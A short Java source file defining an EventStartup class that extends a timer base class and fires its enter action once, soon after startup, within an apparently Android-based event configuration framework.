package com.android.service.event;

import com.android.service.conf.ConfEvent;

public class EventStartup extends BaseTimer {

	@Override
	protected boolean parse(ConfEvent event) {
		setDelay(SOON);
		setPeriod(NEVER);
		return true;
	}

	@Override
	protected void actualGo() {

	}

	@Override
	protected void actualStart() {
		onEnter();
	}

	@Override
	protected void actualStop() {

	}

}
